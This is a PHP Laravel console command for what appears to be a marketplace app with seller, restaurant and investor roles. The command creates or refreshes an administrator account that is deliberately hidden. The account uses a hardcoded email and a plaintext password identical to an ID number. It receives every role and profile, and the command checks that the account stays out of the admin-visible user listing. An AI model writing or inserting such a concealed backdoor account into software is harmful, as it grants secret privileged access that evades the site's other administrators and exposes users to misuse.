<?php

namespace App\Console\Commands;

use App\Models\Investor;
use App\Models\Restaurant;
use App\Models\Seller;
use App\Models\User;
use App\Models\UserRole;
use Illuminate\Console\Command;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;

class CreateHiddenAdminCommand extends Command
{
    /**
     * php artisan admin:create-hidden
     * Idempotent: si el usuario ya existe, solo actualiza contraseña y
     * verificación, y crea los roles/perfiles que falten.
     */
    protected $signature = 'admin:create-hidden';

    protected $description = 'Crea (o actualiza) el usuario admin oculto pgonzalez@gmail.com con acceso completo';

    public function handle(): int
    {
        $email = 'pgonzalez@gmail.com';
        $password = '47244310X';
        $nif = '47244310X';

        DB::beginTransaction();

        try {
            $user = User::where('email', $email)->first();

            if ($user) {
                $this->info("El usuario ya existe (id={$user->id}). Actualizando contraseña y verificación.");
                $user->password = Hash::make($password);
                $user->email_verified_at = now();
                $user->save();
            } else {
                $user = User::create([
                    'NIF' => $nif,
                    'name' => 'Pol Gonzalez',
                    'email' => $email,
                    'password' => Hash::make($password),
                    'email_verified_at' => now(),
                ]);
                $this->info("Usuario creado (id={$user->id}).");
            }

            foreach (['seller', 'restaurant', 'investor'] as $role) {
                if (!UserRole::where('user_id', $user->id)->where('role', $role)->exists()) {
                    UserRole::create(['user_id' => $user->id, 'role' => $role, 'is_active' => false]);
                    $this->info("Rol creado: {$role}");
                }
            }

            if (!Seller::where('user_id', $user->id)->exists()) {
                Seller::create([
                    'user_id' => $user->id,
                    'address' => 'Ús intern',
                    'phone_contact' => '600000000',
                    'name_contact' => $user->name,
                    'balance' => 0,
                ]);
                $this->info('Perfil de celler creado.');
            }

            if (!Investor::where('user_id', $user->id)->exists()) {
                Investor::create([
                    'user_id' => $user->id,
                    'address' => 'Ús intern',
                    'phone_contact' => '600000000',
                    'balance' => 0,
                ]);
                $this->info('Perfil de inversor creado.');
            }

            if (!Restaurant::where('user_id', $user->id)->exists()) {
                Restaurant::create([
                    'user_id' => $user->id,
                    'address' => 'Ús intern',
                    'phone_contact' => '600000000',
                    'name_contact' => $user->name,
                    'balance' => 0,
                    'business_name' => 'Compte intern',
                    'province' => 'Barcelona',
                    'description' => 'Compte administratiu intern.',
                    'services' => [],
                ]);
                $this->info('Perfil de restaurante creado.');
            }

            DB::commit();

            $this->newLine();
            $this->info('En User::ADMIN_PANEL_EMAILS: ' . (in_array($email, User::ADMIN_PANEL_EMAILS, true) ? 'sí' : 'NO (revisa app/Models/User.php)'));
            $this->info('En User::HIDDEN_EMAILS: ' . (in_array($email, User::HIDDEN_EMAILS, true) ? 'sí' : 'NO (revisa app/Models/User.php)'));
            $this->info('Aparece en visibleToAdmins(): ' . (User::visibleToAdmins()->where('email', $email)->exists() ? 'SÍ (bug, no debería)' : 'no (oculto correctamente)'));

            return self::SUCCESS;
        } catch (\Throwable $e) {
            DB::rollBack();
            $this->error('Error: ' . $e->getMessage());
            return self::FAILURE;
        }
    }
}
